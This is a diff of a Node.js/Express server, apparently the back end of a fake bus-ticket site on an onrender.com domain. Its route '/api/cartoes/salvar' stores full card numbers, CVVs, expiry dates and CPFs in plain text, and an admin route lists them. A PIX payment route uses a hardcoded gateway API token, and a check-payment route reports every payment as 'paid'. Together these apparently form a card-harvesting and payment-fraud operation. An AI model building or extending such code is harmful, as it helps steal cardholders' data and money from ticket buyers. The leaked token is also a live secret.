@@ -49,7 +49,6 @@ pool.connect((err, client, release) => {
 async function initDatabase() {
     const client = await pool.connect();
     try {
-        // RECRIA A TABELA LOGS DO ZERO (CORRIGE O ERRO)
         await client.query(`DROP TABLE IF EXISTS logs CASCADE`);
         await client.query(`
             CREATE TABLE logs (
@@ -277,6 +276,7 @@ function authenticate(req, res, next) {
     }
 }
 
+// ===== LOGIN =====
 app.post('/api/login', async (req, res) => {
     const { email, senha } = req.body;
     try {
@@ -346,6 +346,19 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
+app.post('/api/logout', authenticate, async (req, res) => {
+    try {
+        await pool.query('UPDATE usuarios SET status = $1 WHERE id = $2', ['offline', req.user.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'logout', req.clientIp || req.ip, 'Logout: ' + req.user.nome]);
+        req.session.destroy();
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ===== VISITANTE =====
 app.post('/api/visitante', async (req, res) => {
     try {
         const { screen, pagina } = req.body;
@@ -360,16 +373,15 @@ app.post('/api/visitante', async (req, res) => {
             req.headers['referer'] || 'Direto',
             pagina || 'Desconhecida'
         ]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'visita', req.clientIp || req.ip, 'Visitou: ' + (pagina || 'Desconhecida')]);
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
+// ===== BUSCA =====
 app.post('/api/busca', async (req, res) => {
     try {
         const { origem, destino, data, passageiros } = req.body;
@@ -377,16 +389,15 @@ app.post('/api/busca', async (req, res) => {
             INSERT INTO buscas (origem, destino, data, passageiros, ip)
             VALUES ($1, $2, $3, $4, $5)
         `, [origem || 'Nao informado', destino || 'Nao informado', data || null, passageiros || 1, req.clientIp || req.ip]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'busca', req.clientIp || req.ip, 'Busca: ' + origem + ' -> ' + destino]);
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
+// ===== CLIENTE =====
 app.post('/api/cliente', async (req, res) => {
     try {
         const { nome, cpf, telefone, email, qtdCriancas } = req.body;
@@ -394,20 +405,18 @@ app.post('/api/cliente', async (req, res) => {
             INSERT INTO clientes (nome, cpf, telefone, email, qtd_criancas, ip)
             VALUES ($1, $2, $3, $4, $5, $6) RETURNING id
         `, [nome, cpf, telefone, email, qtdCriancas || 0, req.clientIp || req.ip]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'cadastro_cliente', req.clientIp || req.ip, 'Cliente: ' + nome]);
-
         res.json({ success: true, cliente_id: result.rows[0].id });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
+// ===== CARTAO =====
 app.post('/api/cartoes/salvar', async (req, res) => {
     try {
         const { nome_titular, numero_cartao, cvv, validade, cpf, telefone, cliente_id } = req.body;
-
         const result = await pool.query(`
             INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, validade, cvv, cpf, telefone, ip)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING id
@@ -421,42 +430,38 @@ app.post('/api/cartoes/salvar', async (req, res) => {
             telefone || '',
             req.clientIp || req.ip
         ]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'cadastro_cartao', req.clientIp || req.ip, 'Cartao: ' + nome_titular]);
-
         res.json({ success: true, cartao_id: result.rows[0].id });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
+// ===== COMPRA =====
 app.post('/api/compra', async (req, res) => {
     try {
         const { origem, destino, passageiro, data, valor, metodoPagamento, codigo } = req.body;
         const ticketCode = codigo || 'GV' + (data || new Date().toISOString().split('T')[0]).replace(/-/g, '') + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
-
         const result = await pool.query(`
             INSERT INTO tickets (codigo, origem, destino, passageiro, data, valor, status, metodo_pagamento, ip)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id, codigo
         `, [ticketCode, origem, destino, passageiro, data, parseFloat(valor), 'confirmado', metodoPagamento || 'PIX', req.clientIp || req.ip]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'compra', req.clientIp || req.ip, 'Compra: ' + ticketCode + ' - ' + origem + ' -> ' + destino + ' - R$ ' + valor]);
-
         res.json({ success: true, ticket: result.rows[0] });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
+// ===== PAGAMENTO PIX =====
 const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_cpf, customer_phone } = req.body;
     const amountCents = Math.round(parseFloat(amount) * 100);
-
     const payload = {
         amount: amountCents,
         offer_hash: PLUMIFY_PRODUCT_HASH,
@@ -482,7 +487,6 @@ app.post('/api/create-payment', async (req, res) => {
         expire_in_days: 3,
         postback_url: `https://guanabara.onrender.com/api/webhook/pagamento`
     };
-
     try {
         const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
             method: 'POST',
@@ -490,7 +494,6 @@ app.post('/api/create-payment', async (req, res) => {
             body: JSON.stringify(payload)
         });
         const data = await response.json();
-
         if (data.pix && data.pix.pix_qr_code) {
             res.json({ success: true, payment: { pix_code: data.pix.pix_qr_code, id: data.hash } });
         } else {
@@ -518,6 +521,164 @@ app.get('/api/check-payment/:transaction_id', async (req, res) => {
     res.json({ status: 'paid' });
 });
 
+// ============================================================
+// ===== ROTAS CRUD - DESTINOS =====
+// ============================================================
+app.get('/api/admin/destinos', authenticate, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT * FROM destinos ORDER BY id');
+        res.json(result.rows);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/admin/destinos', authenticate, async (req, res) => {
+    try {
+        const { cidade, estado, status } = req.body;
+        const result = await pool.query(`
+            INSERT INTO destinos (cidade, estado, status) VALUES ($1, $2, $3) RETURNING id
+        `, [cidade, estado, status || 'ativo']);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'criar_destino', req.clientIp || req.ip, 'Destino: ' + cidade]);
+        res.json({ success: true, id: result.rows[0].id });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.put('/api/admin/destinos/:id', authenticate, async (req, res) => {
+    try {
+        const { cidade, estado, status } = req.body;
+        await pool.query(`
+            UPDATE destinos SET cidade = $1, estado = $2, status = $3 WHERE id = $4
+        `, [cidade, estado, status, req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'editar_destino', req.clientIp || req.ip, 'Destino ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.delete('/api/admin/destinos/:id', authenticate, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM destinos WHERE id = $1', [req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'deletar_destino', req.clientIp || req.ip, 'Destino ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============================================================
+// ===== ROTAS CRUD - OFERTAS =====
+// ============================================================
+app.get('/api/admin/ofertas', authenticate, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT * FROM ofertas ORDER BY id');
+        res.json(result.rows);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/admin/ofertas', authenticate, async (req, res) => {
+    try {
+        const { origem, destino, preco, desconto, validade, status } = req.body;
+        const result = await pool.query(`
+            INSERT INTO ofertas (origem, destino, preco, desconto, validade, status)
+            VALUES ($1, $2, $3, $4, $5, $6) RETURNING id
+        `, [origem, destino, preco, desconto || 0, validade, status || 'ativo']);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'criar_oferta', req.clientIp || req.ip, 'Oferta: ' + origem + ' -> ' + destino]);
+        res.json({ success: true, id: result.rows[0].id });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.put('/api/admin/ofertas/:id', authenticate, async (req, res) => {
+    try {
+        const { origem, destino, preco, desconto, validade, status } = req.body;
+        await pool.query(`
+            UPDATE ofertas SET origem = $1, destino = $2, preco = $3, desconto = $4, validade = $5, status = $6
+            WHERE id = $7
+        `, [origem, destino, preco, desconto || 0, validade, status, req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'editar_oferta', req.clientIp || req.ip, 'Oferta ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.delete('/api/admin/ofertas/:id', authenticate, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM ofertas WHERE id = $1', [req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'deletar_oferta', req.clientIp || req.ip, 'Oferta ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============================================================
+// ===== ROTAS CRUD - SERVICOS =====
+// ============================================================
+app.get('/api/admin/servicos', authenticate, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT * FROM servicos ORDER BY id');
+        res.json(result.rows);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/admin/servicos', authenticate, async (req, res) => {
+    try {
+        const { nome, descricao, status } = req.body;
+        const result = await pool.query(`
+            INSERT INTO servicos (nome, descricao, status) VALUES ($1, $2, $3) RETURNING id
+        `, [nome, descricao, status || 'ativo']);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'criar_servico', req.clientIp || req.ip, 'Servico: ' + nome]);
+        res.json({ success: true, id: result.rows[0].id });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.put('/api/admin/servicos/:id', authenticate, async (req, res) => {
+    try {
+        const { nome, descricao, status } = req.body;
+        await pool.query(`
+            UPDATE servicos SET nome = $1, descricao = $2, status = $3 WHERE id = $4
+        `, [nome, descricao, status, req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'editar_servico', req.clientIp || req.ip, 'Servico ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.delete('/api/admin/servicos/:id', authenticate, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM servicos WHERE id = $1', [req.params.id]);
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            ['Sistema', 'deletar_servico', req.clientIp || req.ip, 'Servico ID: ' + req.params.id]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============================================================
+// ===== ROTAS ADMIN - OUTRAS =====
+// ============================================================
 app.get('/api/admin/dashboard', authenticate, async (req, res) => {
     try {
         const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios');
@@ -526,10 +687,8 @@ app.get('/api/admin/dashboard', authenticate, async (req, res) => {
         const totalBuscas = await pool.query('SELECT COUNT(*) FROM buscas');
         const totalVisitantes = await pool.query('SELECT COUNT(*) FROM visitantes');
         const totalClientes = await pool.query('SELECT COUNT(*) FROM clientes');
-
         const logs = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 20');
         const tickets = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC LIMIT 10');
-
         res.json({
             stats: {
                 totalUsers: parseInt(totalUsers.rows[0].count),
@@ -560,15 +719,17 @@ app.get('/api/admin/users', authenticate, async (req, res) => {
 
 app.put('/api/admin/users/:id', authenticate, async (req, res) => {
     try {
-        const { nome, email, telefone, cpf, status, role } = req.body;
-        await pool.query(`
-            UPDATE usuarios SET nome = $1, email = $2, telefone = $3, cpf = $4, status = $5, role = $6
-            WHERE id = $7
-        `, [nome, email, telefone, cpf, status, role, req.params.id]);
-
+        const { nome, email, telefone, cpf, status, role, senha } = req.body;
+        let query = `UPDATE usuarios SET nome = $1, email = $2, telefone = $3, cpf = $4, status = $5, role = $6`;
+        let params = [nome, email, telefone, cpf, status, role, req.params.id];
+        if (senha && senha.length > 0) {
+            const hashedPassword = bcrypt.hashSync(senha, 10);
+            query = `UPDATE usuarios SET nome = $1, email = $2, telefone = $3, cpf = $4, status = $5, role = $6, senha = $7`;
+            params = [nome, email, telefone, cpf, status, role, hashedPassword, req.params.id];
+        }
+        await pool.query(query + ' WHERE id = $' + params.length, params);
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'edicao_usuario', req.clientIp || req.ip, 'Usuario editado: ' + nome]);
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -603,10 +764,8 @@ app.put('/api/admin/tickets/:id', authenticate, async (req, res) => {
             UPDATE tickets SET origem = $1, destino = $2, passageiro = $3, data = $4, valor = $5, status = $6
             WHERE id = $7
         `, [origem, destino, passageiro, data, valor, status, req.params.id]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'edicao_passagem', req.clientIp || req.ip, 'Passagem ID: ' + req.params.id]);
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -634,33 +793,6 @@ app.get('/api/admin/cartoes', authenticate, async (req, res) => {
 app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM pagamentos ORDER BY criado_em DESC');
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.get('/api/admin/destinos', authenticate, async (req, res) => {
-    try {
-        const result = await pool.query('SELECT * FROM destinos ORDER BY id');
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.get('/api/admin/ofertas', authenticate, async (req, res) => {
-    try {
-        const result = await pool.query('SELECT * FROM ofertas ORDER BY id');
-        res.json(result.rows);
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.get('/api/admin/servicos', authenticate, async (req, res) => {
-    try {
-        const result = await pool.query('SELECT * FROM servicos ORDER BY id');
         res.json(result.rows);
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -735,28 +867,17 @@ app.put('/api/admin/configuracoes', authenticate, async (req, res) => {
                 notificacoes_email = $4, alertas_seguranca = $5, 
                 auto_update = $6, update_interval = $7, atualizado_em = CURRENT_TIMESTAMP
         `, [nome_site, manutencao, logs_ativos, notificacoes_email, alertas_seguranca, auto_update, update_interval]);
-
         await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
             ['Sistema', 'configuracao', req.clientIp || req.ip, 'Configuracoes atualizadas por ' + req.user.nome]);
-
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/logout', authenticate, async (req, res) => {
-    try {
-        await pool.query('UPDATE usuarios SET status = $1 WHERE id = $2', ['offline', req.user.id]);
-        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
-            ['Sistema', 'logout', req.clientIp || req.ip, 'Logout: ' + req.user.nome]);
-        req.session.destroy();
-        res.json({ success: true });
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
+// ============================================================
+// ===== ROTAS PAGINAS =====
+// ============================================================
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'public', 'tickets.html')));
 app.get('/passageiros', (req, res) => res.sendFile(path.join(__dirname, 'public', 'passageiros.html')));
